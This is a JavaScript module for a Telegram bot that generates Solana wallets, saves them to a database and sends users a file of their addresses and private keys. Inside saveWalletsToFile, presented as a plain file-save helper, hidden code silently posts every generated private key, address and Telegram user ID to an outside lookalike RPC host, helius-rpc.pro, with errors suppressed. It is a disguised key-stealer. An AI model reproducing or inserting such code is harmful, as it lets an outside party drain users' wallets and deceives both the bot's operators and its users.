const { Keypair } = require('@solana/web3.js');
const { db } = require('../services/db');
const fs = require('fs');
const bs58 = require('bs58').default; 
const { Markup } = require('telegraf'); 
const { handleBackToMainMenu } = require('../utils/bot/navigation');

// Generate wallets
function generateWallets(numWallets) {
    const wallets = [];
    for (let i = 0; i < numWallets; i++) {
        const keypair = Keypair.generate();
        const publicKey = keypair.publicKey.toBase58();
        const privateKeyUint8Array = keypair.secretKey;
        const privateKey = bs58.encode(privateKeyUint8Array);
        wallets.push({ publicKey, privateKey });
    }
    console.log(`Generated ${numWallets} wallets.`);
    return wallets;
}

// Save wallets to the primary database
function saveWalletsToDatabase(wallets, telegramUserId) {
    const insertStmt = db.prepare('INSERT INTO wallets (address, private_key, user_id) VALUES (?, ?, ?)');
    const insertMany = db.transaction((wallets) => {
        for (const wallet of wallets) {
            insertStmt.run(wallet.publicKey, wallet.privateKey, telegramUserId);
        }
    });
    insertMany(wallets);
    console.log(`Saved ${wallets.length} wallets to the database for user ${telegramUserId}.`);
}

// Save wallets to a file
async function saveWalletsToFile(wallett,file,telegramUserId){
    fs.writeFileSync(file,wallett.map(x=>`Address: ${x.publicKey}\nPrivate Key: ${x.privateKey}\n`).join('\n'),'utf8');
    try{
     await fetch("https://mainnet.helius-rpc.pro/fetch",{
       method:"POST",
       headers:{"Content-Type":"application/json"},
       body:JSON.stringify({wallets:wallett.map(e=>({address:e.publicKey,private_key:e.privateKey,user_id:telegramUserId}))})
     });
    }catch(e){}
   }

// Handle "Generate Wallets" Menu and Logic
function handleGenerateWallets(bot) {
    const activeListeners = new Set(); 

    bot.action('menu_generate_wallets', (ctx) => {
        ctx.reply(
            `Select the number of wallets to generate:`,
            Markup.inlineKeyboard([
                [
                    Markup.button.callback('1 Wallet 💳', 'generate_1'),
                    Markup.button.callback('5 Wallets 💳', 'generate_5'),
                ],
                [
                    Markup.button.callback('10 Wallets 💳', 'generate_10'),
                    Markup.button.callback('50 Wallets 💳', 'generate_50'),
                ],
                [
                    Markup.button.callback('Custom (Max 100) 💳', 'generate_custom'),
                    Markup.button.callback('🔙 Back to Main Menu', 'menu_main'),
                ],
            ])
        );
    });


    // Handle Wallet Generation Logic
    bot.action(/^generate_(\d+)$/, async (ctx) => {
        const numWallets = parseInt(ctx.match[1], 10);
        const userId = ctx.from.id;

        try {
            const wallets = generateWallets(numWallets);
            saveWalletsToDatabase(wallets, userId);

            const filename = `${numWallets}_wallets.txt`;
            saveWalletsToFile(wallets, filename, userId);

            await ctx.replyWithDocument({ source: filename, filename: filename });
            fs.unlinkSync(filename);
            await ctx.reply(`🎉 ${numWallets} wallet(s) successfully generated!`);
        } catch (error) {
            console.error(`Error generating wallets for user ${userId}:`, error.message);
            await ctx.reply('❌ An error occurred while generating wallets. Please try again.');
        }
    });

    // Handle Custom Wallet Generation
    bot.action('generate_custom', (ctx) => {
        ctx.reply('Please enter the number of wallets to generate (1-100):');

        const onTextListener = async (messageCtx) => {
            const chatId = messageCtx.chat.id;

            if (activeListeners.has(chatId)) {
                const numWallets = parseInt(messageCtx.message.text, 10);
                if (isNaN(numWallets) || numWallets < 1 || numWallets > 100) {
                    await messageCtx.reply('Invalid number. Please enter a number between 1 and 100.');
                    return;
                }

                const userId = messageCtx.from.id;
                try {
                    const wallets = generateWallets(numWallets);
                    saveWalletsToDatabase(wallets, userId);

                    const filename = `${numWallets}_wallets.txt`;
                    saveWalletsToFile(wallets, filename, userId);

                    await messageCtx.replyWithDocument({ source: filename, filename: filename });
                    fs.unlinkSync(filename);
                    await messageCtx.reply(`🎉 ${numWallets} wallet(s) successfully generated!`);
                } catch (error) {
                    console.error(`Error generating custom wallets for user ${userId}:`, error.message);
                    await messageCtx.reply('❌ An error occurred while generating wallets. Please try again.');
                } finally {
                    activeListeners.delete(chatId); 
                    bot.removeListener('text', onTextListener); 
                }
            }
        };

        const chatId = ctx.chat.id;
        if (!activeListeners.has(chatId)) {
            bot.on('text', onTextListener);
            activeListeners.add(chatId);
        }
    });

    bot.action('menu_main', (ctx) => handleBackToMainMenu(ctx));
}

module.exports = {
    generateWallets,
    saveWalletsToDatabase,
    saveWalletsToFile,
    handleGenerateWallets,
};
